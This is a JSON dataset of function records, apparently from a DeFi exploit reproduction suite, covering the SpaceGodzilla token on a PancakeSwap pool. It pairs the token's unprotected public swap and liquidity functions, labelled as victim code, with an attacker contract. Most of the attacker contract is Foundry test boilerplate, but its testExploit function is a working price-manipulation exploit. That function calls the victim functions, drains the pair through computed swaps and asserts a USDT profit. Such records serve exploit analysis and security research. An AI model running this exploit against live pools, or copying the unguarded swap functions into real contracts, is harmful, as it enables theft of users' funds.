[
  {
    "contract/interface": "ISpaceGodzilla",
    "source_type": "victim_contract",
    "function_name": "swapAndLiquifyStepv1",
    "original_code": "    function swapAndLiquifyStepv1() public {\n        uint256 ethBalance = ETH.balanceOf(address(this));\n        uint256 tokenBalance = balanceOf(address(this));\n        addLiquidityUsdt(tokenBalance, ethBalance);\n    }\n\t\n",
    "description": ""
  },
  {
    "contract/interface": "ISpaceGodzilla",
    "source_type": "victim_contract",
    "function_name": "swapTokensForOther",
    "original_code": "    function swapTokensForOther(uint256 tokenAmount) public {\n\t\taddress[] memory path = new address[](2);\n        path[0] = address(this);\n        path[1] = address(_baseToken);\n        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            tokenAmount,\n            0,\n            path,\n            address(warp),\n            block.timestamp\n        );\n        warp.withdraw();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        uint256 init_capital = IERC20(USDT).balanceOf(address(this));\n        emit log_named_decimal_uint(\"[info] Attacker USDT Balance\", init_capital, 18);\n\n        // ========================================================\n        ISpaceGodzilla(SpaceGodzilla).swapTokensForOther(69_127_461_036_369_179_405_415_017_714);\n        (uint256 r0, uint256 r1,) = Uni_Pair_V2(CakeLP).getReserves();\n        assert(r0 == 76_041_697_635_825_849_047_705_725_848_735);\n        assert(r1 == 90_478_604_689_102_338_898_952);\n        // ========================================================\n        uint256 usdt_balance = IERC20(USDT).balanceOf(address(this));\n        uint256 trans_usdt_balance = usdt_balance - 100_000;\n        bool suc = IERC20(USDT).transfer(CakeLP, trans_usdt_balance);\n        require(suc, \"Transfer Failed\");\n        // ========================================================\n        uint256 amount0Out = r0 - (r0 * 30 / 1000);\n        emit log_named_uint(\"First swap amount0Out\", amount0Out);\n        Uni_Pair_V2(CakeLP).swap(amount0Out, 0, address(this), \"\"); // 73,775,430,786,944,730,258,898,675,433,018 \u53ef\u80fd\u6703\u8b8a\u52d5\uff0c\u56e0\u70ba\u4e0d\u77e5\u9053\u653b\u64ca\u8005\u600e\u9ebc\u7b973\uff05\u624b\u7e8c\u8cbb\n        // ========================================================\n        ISpaceGodzilla(SpaceGodzilla).swapAndLiquifyStepv1();\n        // ========================================================\n        uint256 SpaceGodzilla_balance = IERC20(SpaceGodzilla).balanceOf(address(this)); //  71,562,167,863,336,388,351,131,715,170,010 \u53ef\u80fd\u6703\u8b8a\u52d5\uff0c\u56e0\u70ba\u4e0d\u77e5\u9053\u653b\u64ca\u8005\u600e\u9ebc\u7b973\uff05\u624b\u7e8c\u8cbb\n        emit log_named_uint(\"address(this) SpaceGodzilla_balance\", SpaceGodzilla_balance);\n        // ========================================================\n        (r0, r1,) = Uni_Pair_V2(CakeLP).getReserves(); // 2,288,901,594,081,170,758,102,038,305,061     3,073,671,601,005,728,817,436,539\n        assert(r1 == 3_073_671_601_005_728_817_436_539);\n        // ========================================================\n        suc = IERC20(USDT).transfer(CakeLP, 20_000);\n        require(suc, \"Transfer Failed\");\n        // ========================================================\n        suc = IERC20(SpaceGodzilla).transfer(CakeLP, SpaceGodzilla_balance); // Transfer \u6240\u6709 SpaceGodzilla \u7d66 LP\n        require(suc, \"Transfer Failed\");\n        // ========================================================\n        uint256 LP_SpaceGodzilla_balance = IERC20(SpaceGodzilla).balanceOf(address(CakeLP));\n        emit log_named_uint(\"address(CakeLP) SpaceGodzilla_balance\", LP_SpaceGodzilla_balance); // 73,851,069,457,417,559,109,233,753,475,071 \u53ef\u80fd\u6703\u8b8a\u52d5\uff0c\u56e0\u70ba\u4e0d\u77e5\u9053\u653b\u64ca\u8005\u600e\u9ebc\u7b973\uff05\u624b\u7e8c\u8cbb\n        // ========================================================\n        uint256 amount1Out = r1 - (r1 * 32 / 1000);\n        emit log_named_uint(\"First swap amount1Out\", amount1Out); // 2,978,176,485,325,154,862,214,560\n        Uni_Pair_V2(CakeLP).swap(0, amount1Out, address(this), \"\");\n\n        // ========================================================\n        usdt_balance = IERC20(USDT).balanceOf(address(this));\n        emit log_named_decimal_uint(\"[info] Attacker Wallet USDT Balance\", usdt_balance, 18);\n\n        require(usdt_balance > init_capital, \"Exploit Failed, attacker take losses\");\n        uint256 profit = usdt_balance - init_capital;\n        emit log_named_decimal_uint(\"[Profit] Attacker Wallet USDT Profit\", profit, 18);\n    }\n\n",
    "description": ""
  }
]